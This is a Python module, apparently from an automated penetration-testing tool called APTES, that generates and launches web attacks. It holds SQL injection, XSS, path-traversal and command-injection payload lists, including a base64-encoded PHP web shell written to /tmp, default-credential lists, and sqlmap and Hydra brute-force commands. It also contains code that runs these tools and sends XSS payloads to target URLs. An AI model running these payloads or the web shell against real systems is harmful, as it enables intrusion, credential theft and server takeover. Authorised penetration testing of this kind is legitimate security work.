#!/usr/bin/env python3
"""
Payload generation utilities for APTES
"""

import os
import re
import logging
import subprocess
import tempfile
from urllib.parse import urlparse

logger = logging.getLogger('aptes.payloads')

# Check for optional imports
try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

def generate_payload_for_vulnerability(vuln):
    """
    Generate payload for a specific vulnerability
    
    Args:
        vuln (dict): Vulnerability information
    
    Returns:
        dict: Payload information
    """
    vuln_name = vuln.get("vulnerability", "").lower()
    
    # Generate payload based on vulnerability type
    if "sql injection" in vuln_name:
        return generate_sql_injection_payload(vuln)
    elif "xss" in vuln_name or "cross-site scripting" in vuln_name:
        return generate_xss_payload(vuln)
    elif "file inclusion" in vuln_name or "lfi" in vuln_name:
        return generate_lfi_payload(vuln)
    elif "rce" in vuln_name or "remote code execution" in vuln_name or "command injection" in vuln_name:
        return generate_rce_payload(vuln)
    elif "default credential" in vuln_name or "weak password" in vuln_name:
        return generate_default_creds_payload(vuln)
    else:
        # Generic payload for unrecognized vulnerability
        return {
            "vulnerability": vuln.get("vulnerability", "Unknown"),
            "target": f"{vuln.get('host', 'unknown')}:{vuln.get('port', 'unknown')}",
            "service": vuln.get("service", "unknown"),
            "type": "generic",
            "payload": "# Manual testing required\n# No automated payload available for this vulnerability type",
            "notes": "This vulnerability requires manual testing or a specialized payload generator."
        }

def generate_sql_injection_payload(finding):
    """
    Generate SQL injection payload
    
    Args:
        finding (dict): Finding information
    
    Returns:
        dict: Payload information
    """
    host = finding.get("host", "unknown")
    port = finding.get("port", "unknown")
    url = finding.get("url", f"http://{host}:{port}")
    
    # Parse URL to get query params
    parsed_url = urlparse(url)
    path = parsed_url.path or "/"
    
    # Generate SQLMap command
    sqlmap_cmd = f"sqlmap -u \"{url}\" --batch --random-agent --risk=3 --level=5"
    
    # Add form data if available
    if "form_params" in finding:
        form_params = finding["form_params"]
        form_method = form_params.get("method", "GET").upper()
        form_action = form_params.get("action", "")
        form_data = form_params.get("data", {})
        
        if form_data:
            data_params = "&".join([f"{k}={v}" for k, v in form_data.items()])
            sqlmap_cmd = f"sqlmap -u \"{url}{form_action}\" --data=\"{data_params}\" --method={form_method} --batch --random-agent --risk=3 --level=5"
    
    # Add advanced techniques
    sqlmap_cmd += " --technique=BEUSTQ"
    
    # Generate test payloads
    test_payloads = [
        "' OR 1=1 --",
        "' OR '1'='1",
        "1' OR '1'='1' --",
        "' UNION SELECT NULL,NULL,NULL-- -",
        "' UNION SELECT @@version,NULL,NULL-- -",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --"
    ]
    
    return {
        "vulnerability": finding.get("vulnerability", finding.get("finding", "SQL Injection")),
        "target": url,
        "service": finding.get("service", "http"),
        "type": "sql_injection",
        "command": sqlmap_cmd,
        "test_payloads": test_payloads,
        "notes": "Use SQLMap for comprehensive testing. Manual verification may be required."
    }

def generate_xss_payload(finding):
    """
    Generate Cross-Site Scripting payload
    
    Args:
        finding (dict): Finding information
    
    Returns:
        dict: Payload information
    """
    host = finding.get("host", "unknown")
    port = finding.get("port", "unknown")
    url = finding.get("url", f"http://{host}:{port}")
    
    # Generate XSSer or XSSniper command
    xss_cmd = f"python3 xssniper.py -u \"{url}\" --auto"
    
    # Add form data if available
    if "form_params" in finding:
        form_params = finding["form_params"]
        form_method = form_params.get("method", "GET").upper()
        form_action = form_params.get("action", "")
        form_data = form_params.get("data", {})
        
        if form_data:
            xss_cmd = f"python3 xssniper.py -u \"{url}{form_action}\" --data=\"{form_data}\" --method={form_method}"
    
    # Generate test payloads from basic to advanced
    test_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<iframe src=\"javascript:alert('XSS')\"></iframe>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "\"><script>alert('XSS')</script>",
        "';alert('XSS');//",
        "<img src=\"x\" onerror=\"&#x61;&#x6C;&#x65;&#x72;&#x74;('XSS')\">"
    ]
    
    return {
        "vulnerability": finding.get("vulnerability", finding.get("finding", "Cross-Site Scripting")),
        "target": url,
        "service": finding.get("service", "http"),
        "type": "xss",
        "command": xss_cmd,
        "test_payloads": test_payloads,
        "notes": "Test each payload manually if automated tools fail. Consider context-specific XSS variants."
    }

def generate_lfi_payload(finding):
    """
    Generate Local File Inclusion payload
    
    Args:
        finding (dict): Finding information
    
    Returns:
        dict: Payload information
    """
    host = finding.get("host", "unknown")
    port = finding.get("port", "unknown")
    url = finding.get("url", f"http://{host}:{port}")
    
    # Parse URL to identify potential vulnerable parameters
    parsed_url = urlparse(url)
    query = parsed_url.query
    
    vulnerable_param = ""
    if query:
        params = query.split("&")
        for param in params:
            if "=" in param:
                key, value = param.split("=", 1)
                if any(pattern in value.lower() for pattern in ["file", "path", "include", "doc", "template"]):
                    vulnerable_param = key
                    break
        
        if not vulnerable_param and params:
            # Take the first parameter if none looks vulnerable
            first_param = params[0].split("=", 1)[0] if "=" in params[0] else ""
            if first_param:
                vulnerable_param = first_param
    
    # Prepare base URL for payload testing
    base_url = url
    if vulnerable_param:
        # Replace existing parameter value with placeholder
        base_url = re.sub(f"{vulnerable_param}=[^&]+", f"{vulnerable_param}=PAYLOAD", base_url)
    elif "?" in url:
        # Append to existing query string
        base_url = f"{url}&file=PAYLOAD"
    else:
        # Create new query string
        base_url = f"{url}?file=PAYLOAD"
    
    # Generate test payloads
    test_payloads = [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../../../../../../etc/passwd",
        "/etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "../../../etc/passwd%00",
        "..\\..\\..\\windows\\win.ini",
        "/proc/self/environ",
        "/var/log/apache2/access.log",
        "/var/log/apache/access.log",
        "/var/log/httpd/access.log",
        "php://filter/convert.base64-encode/resource=/etc/passwd"
    ]
    
    # Command to test with LFISuite or similar tool
    lfi_cmd = f"python lfisuite.py -u \"{url}\""
    
    # Create formatted payloads for testing
    formatted_payloads = []
    for payload in test_payloads:
        formatted_url = base_url.replace("PAYLOAD", payload)
        formatted_payloads.append(formatted_url)
    
    return {
        "vulnerability": finding.get("vulnerability", finding.get("finding", "Local File Inclusion")),
        "target": url,
        "service": finding.get("service", "http"),
        "type": "lfi",
        "command": lfi_cmd,
        "test_payloads": test_payloads,
        "formatted_urls": formatted_payloads[:5],  # First 5 for brevity
        "notes": "Test each payload manually. Look for exposed sensitive files and potential RCE vectors."
    }

def generate_rce_payload(finding):
    """
    Generate Remote Code Execution payload
    
    Args:
        finding (dict): Finding information
    
    Returns:
        dict: Payload information
    """
    host = finding.get("host", "unknown")
    port = finding.get("port", "unknown")
    url = finding.get("url", f"http://{host}:{port}")
    
    # Parse URL to identify potential vulnerable parameters
    parsed_url = urlparse(url)
    query = parsed_url.query
    
    vulnerable_param = ""
    if query:
        params = query.split("&")
        for param in params:
            if "=" in param:
                key, value = param.split("=", 1)
                if any(pattern in key.lower() for pattern in ["cmd", "exec", "command", "run", "system"]):
                    vulnerable_param = key
                    break
    
    # Prepare base URL for payload testing
    base_url = url
    if vulnerable_param:
        # Replace existing parameter value with placeholder
        base_url = re.sub(f"{vulnerable_param}=[^&]+", f"{vulnerable_param}=PAYLOAD", base_url)
    elif "?" in url:
        # Append to existing query string
        base_url = f"{url}&cmd=PAYLOAD"
    else:
        # Create new query string
        base_url = f"{url}?cmd=PAYLOAD"
    
    # Generate test payloads
    test_payloads = [
        "id",
        "whoami",
        "ls -la",
        "cat /etc/passwd",
        "echo PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+ > /tmp/cmd.php",
        "ping -c 2 127.0.0.1",
        "sleep 5",
        "`sleep 5`",
        "$(sleep 5)",
        ";sleep 5;",
        "& ping -c 2 127.0.0.1 &",
        "| cat /etc/passwd",
        "; cat /etc/passwd;",
        "dir",
        "cmd /c dir",
        "powershell -c \"Get-Process\""
    ]
    
    # Create encoded payloads for testing
    encoded_payloads = []
    for payload in test_payloads:
        # URL encoding
        encoded_payload = payload.replace(" ", "%20").replace(";", "%3B").replace("|", "%7C")
        encoded_payloads.append(encoded_payload)
    
    # Command to test with commix or similar tool
    commix_cmd = f"commix --url=\"{url}\" --batch"
    
    # Create formatted payloads for testing
    formatted_payloads = []
    for payload in encoded_payloads:
        formatted_url = base_url.replace("PAYLOAD", payload)
        formatted_payloads.append(formatted_url)
    
    return {
        "vulnerability": finding.get("vulnerability", finding.get("finding", "Remote Code Execution")),
        "target": url,
        "service": finding.get("service", "http"),
        "type": "rce",
        "command": commix_cmd,
        "test_payloads": test_payloads,
        "encoded_payloads": encoded_payloads[:5],  # First 5 for brevity
        "formatted_urls": formatted_payloads[:5],  # First 5 for brevity
        "notes": "Start with simple commands for testing. Adjust payloads based on server technology (Linux/Windows)."
    }

def generate_default_creds_payload(finding):
    """
    Generate default credentials testing payload
    
    Args:
        finding (dict): Finding information
    
    Returns:
        dict: Payload information
    """
    host = finding.get("host", "unknown")
    port = finding.get("port", "unknown")
    service = finding.get("service", "").lower()
    
    # Common default credentials by service
    default_creds = {
        "ssh": [
            {"username": "root", "password": "root"},
            {"username": "root", "password": "toor"},
            {"username": "root", "password": "password"},
            {"username": "admin", "password": "admin"},
            {"username": "admin", "password": "password"},
            {"username": "ubuntu", "password": "ubuntu"}
        ],
        "ftp": [
            {"username": "anonymous", "password": ""},
            {"username": "anonymous", "password": "anonymous"},
            {"username": "admin", "password": "admin"},
            {"username": "ftp", "password": "ftp"},
            {"username": "user", "password": "password"}
        ],
        "telnet": [
            {"username": "root", "password": "root"},
            {"username": "admin", "password": "admin"},
            {"username": "admin", "password": "password"},
            {"username": "user", "password": "password"},
            {"username": "", "password": ""}
        ],
        "http": [
            {"username": "admin", "password": "admin"},
            {"username": "admin", "password": "password"},
            {"username": "admin", "password": "admin123"},
            {"username": "administrator", "password": "administrator"},
            {"username": "admin", "password": ""},
            {"username": "root", "password": "root"},
            {"username": "user", "password": "user"}
        ],
        "mysql": [
            {"username": "root", "password": ""},
            {"username": "root", "password": "root"},
            {"username": "root", "password": "password"},
            {"username": "admin", "password": "admin"},
            {"username": "mysql", "password": "mysql"}
        ],
        "mssql": [
            {"username": "sa", "password": ""},
            {"username": "sa", "password": "sa"},
            {"username": "sa", "password": "password"},
            {"username": "admin", "password": "admin"}
        ],
        "vnc": [
            {"username": "", "password": ""},
            {"username": "admin", "password": "admin"},
            {"username": "admin", "password": "password"},
            {"username": "root", "password": "password"}
        ],
        "snmp": [
            {"community": "public"},
            {"community": "private"},
            {"community": "admin"},
            {"community": "system"}
        ]
    }
    
    # Select credentials based on service
    selected_creds = []
    for service_type, creds_list in default_creds.items():
        if service_type in service:
            selected_creds = creds_list
            break
    
    # If service not found, use a combination of HTTP and SSH credentials
    if not selected_creds:
        selected_creds = default_creds.get("http", []) + default_creds.get("ssh", [])
    
    # Generate hydra command if applicable
    hydra_cmd = ""
    if service in ["ssh", "ftp", "telnet", "mysql", "mssql"]:
        creds_file = f"{host}_{service}_creds.txt"
        hydra_cmd = f"hydra -L users.txt -P passwords.txt {host} {service}"
        if port != "unknown":
            hydra_cmd += f" -s {port}"
    
    # For HTTP services, check for login forms
    if "http" in service:
        url = finding.get("url", f"http://{host}:{port}")
        hydra_cmd = f"hydra -L users.txt -P passwords.txt {host} http-post-form \"/login:username=^USER^&password=^PASS^:F=Login failed\""
        if port != "unknown" and port not in ["80", "443"]:
            hydra_cmd += f" -s {port}"
    
    return {
        "vulnerability": finding.get("vulnerability", finding.get("finding", "Default Credentials")),
        "target": f"{host}:{port}",
        "service": service,
        "type": "default_credentials",
        "credentials": selected_creds,
        "command": hydra_cmd if hydra_cmd else "Manual testing required",
        "notes": "Test each credential pair manually or with automated tools like Hydra."
    }

def execute_sqlmap(url, params=None, data=None, cookies=None, headers=None, output_dir=None):
    """
    Execute SQLMap against a target and return results
    
    Args:
        url (str): Target URL
        params (str): Parameters to test
        data (str): POST data
        cookies (str): Cookies to use
        headers (dict): Headers to use
        output_dir (str): Output directory
        
    Returns:
        dict: SQLMap results
    """
    if not output_dir:
        output_dir = tempfile.mkdtemp(prefix="aptes_sqlmap_")
    
    # Base SQLMap command
    cmd = ["sqlmap", "-u", url, "--batch", "--output-dir", output_dir]
    
    # Add options if provided
    if params:
        cmd.extend(["-p", params])
    
    if data:
        cmd.extend(["--data", data])
    
    if cookies:
        cmd.extend(["--cookie", cookies])
    
    if headers:
        for key, value in headers.items():
            cmd.extend(["--headers", f"{key}: {value}"])
    
    # Add techniques
    cmd.extend(["--technique", "BEUSTQ"])
    
    # Add level and risk
    cmd.extend(["--level", "3", "--risk", "2"])
    
    # Execute SQLMap
    logger.info(f"Executing SQLMap: {' '.join(cmd)}")
    try:
        process = subprocess.Popen(
            cmd, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,
            universal_newlines=True
        )
        stdout, stderr = process.communicate(timeout=300)  # 5 minute timeout
        
        # Parse results
        results = {
            "command": " ".join(cmd),
            "output": stdout,
            "output_dir": output_dir,
            "vulnerabilities": []
        }
        
        # Check for vulnerabilities
        if "is vulnerable" in stdout:
            results["vulnerable"] = True
            
            # Extract vulnerability types
            if "GET parameter" in stdout:
                param_match = re.search(r"GET parameter '([^']+)' is vulnerable", stdout)
                if param_match:
                    results["vulnerabilities"].append({
                        "type": "sql_injection",
                        "parameter": param_match.group(1),
                        "method": "GET"
                    })
            
            if "POST parameter" in stdout:
                param_match = re.search(r"POST parameter '([^']+)' is vulnerable", stdout)
                if param_match:
                    results["vulnerabilities"].append({
                        "type": "sql_injection",
                        "parameter": param_match.group(1),
                        "method": "POST"
                    })
        else:
            results["vulnerable"] = False
        
        return results
    
    except subprocess.TimeoutExpired:
        logger.error("SQLMap execution timed out")
        return {
            "command": " ".join(cmd),
            "error": "Execution timed out",
            "output_dir": output_dir,
            "vulnerable": False
        }
    except Exception as e:
        logger.error(f"Error executing SQLMap: {str(e)}")
        return {
            "command": " ".join(cmd),
            "error": str(e),
            "output_dir": output_dir,
            "vulnerable": False
        }

def execute_xss_scan(url, params=None, data=None, cookies=None, headers=None):
    """
    Execute XSS scanning against a target and return results
    
    Args:
        url (str): Target URL
        params (str): Parameters to test
        data (str): POST data
        cookies (str): Cookies to use
        headers (dict): Headers to use
        
    Returns:
        dict: XSS scan results
    """
    # Check if XSSniper is installed
    xssniper_installed = False
    try:
        subprocess.check_output(["python3", "-c", "import xssniper"], stderr=subprocess.STDOUT)
        xssniper_installed = True
    except:
        pass
    
    # If XSSniper not available, use custom scanning logic
    if not xssniper_installed:
        return execute_custom_xss_scan(url, params, data, cookies, headers)
    
    # Base XSSniper command
    cmd = ["python3", "xssniper.py", "-u", url, "--auto"]
    
    # Add options if provided
    if data:
        cmd.extend(["--data", data])
    
    if cookies:
        cmd.extend(["--cookie", cookies])
    
    # Execute XSSniper
    logger.info(f"Executing XSS scan: {' '.join(cmd)}")
    try:
        process = subprocess.Popen(
            cmd, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,
            universal_newlines=True
        )
        stdout, stderr = process.communicate(timeout=180)  # 3 minute timeout
        
        # Parse results
        results = {
            "command": " ".join(cmd),
            "output": stdout,
            "vulnerabilities": []
        }
        
        # Check for vulnerabilities
        if "XSS found" in stdout or "Vulnerable" in stdout:
            results["vulnerable"] = True
            
            # Extract vulnerability details (depends on XSSniper output format)
            param_matches = re.findall(r"Parameter: ([^\s]+)", stdout)
            for param in param_matches:
                results["vulnerabilities"].append({
                    "type": "xss",
                    "parameter": param
                })
        else:
            results["vulnerable"] = False
        
        return results
    
    except subprocess.TimeoutExpired:
        logger.error("XSS scan execution timed out")
        return {
            "command": " ".join(cmd),
            "error": "Execution timed out",
            "vulnerable": False
        }
    except Exception as e:
        logger.error(f"Error executing XSS scan: {str(e)}")
        return {
            "command": " ".join(cmd),
            "error": str(e),
            "vulnerable": False
        }

def execute_custom_xss_scan(url, params=None, data=None, cookies=None, headers=None):
    """
    Execute custom XSS scanning logic when XSSniper is not available
    
    Args:
        url (str): Target URL
        params (str): Parameters to test
        data (str): POST data
        cookies (str): Cookies to use
        headers (dict): Headers to use
        
    Returns:
        dict: XSS scan results
    """
    if not REQUESTS_AVAILABLE:
        return {
            "error": "Requests library not available",
            "vulnerable": False
        }
    
    results = {
        "command": "Custom XSS Scanner",
        "vulnerabilities": []
    }
    
    # Test payloads
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "'\"><script>alert('XSS')</script>"
    ]
    
    # Parse URL parameters
    parsed_url = urlparse(url)
    query_params = {}
    if parsed_url.query:
        query_parts = parsed_url.query.split('&')
        for part in query_parts:
            if '=' in part:
                key, value = part.split('=', 1)
                query_params[key] = value
    
    found_vulns = []
    
    # Test GET parameters
    if query_params:
        for param, value in query_params.items():
            for payload in xss_payloads:
                test_params = query_params.copy()
                test_params[param] = payload
                
                # Build test URL
                test_query = '&'.join([f"{k}={v}" for k, v in test_params.items()])
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{test_query}"
                
                try:
                    response = requests.get(test_url, headers=headers, cookies=cookies, timeout=10)
                    if payload in response.text:
                        found_vulns.append({
                            "type": "xss",
                            "parameter": param,
                            "method": "GET",
                            "payload": payload
                        })
                        break  # Found vulnerability in this parameter, move to next
                except Exception as e:
                    logger.debug(f"Error testing {param} with {payload}: {str(e)}")
    
    # Test POST parameters
    if data:
        post_params = {}
        if isinstance(data, str):
            data_parts = data.split('&')
            for part in data_parts:
                if '=' in part:
                    key, value = part.split('=', 1)
                    post_params[key] = value
        
        for param, value in post_params.items():
            for payload in xss_payloads:
                test_params = post_params.copy()
                test_params[param] = payload
                
                # Build test data
                test_data = '&'.join([f"{k}={v}" for k, v in test_params.items()])
                
                try:
                    response = requests.post(url, data=test_data, headers=headers, cookies=cookies, timeout=10)
                    if payload in response.text:
                        found_vulns.append({
                            "type": "xss",
                            "parameter": param,
                            "method": "POST",
                            "payload": payload
                        })
                        break  # Found vulnerability in this parameter, move to next
                except Exception as e:
                    logger.debug(f"Error testing {param} with {payload}: {str(e)}")
    
    # Update results
    results["vulnerabilities"] = found_vulns
    results["vulnerable"] = len(found_vulns) > 0
    
    return results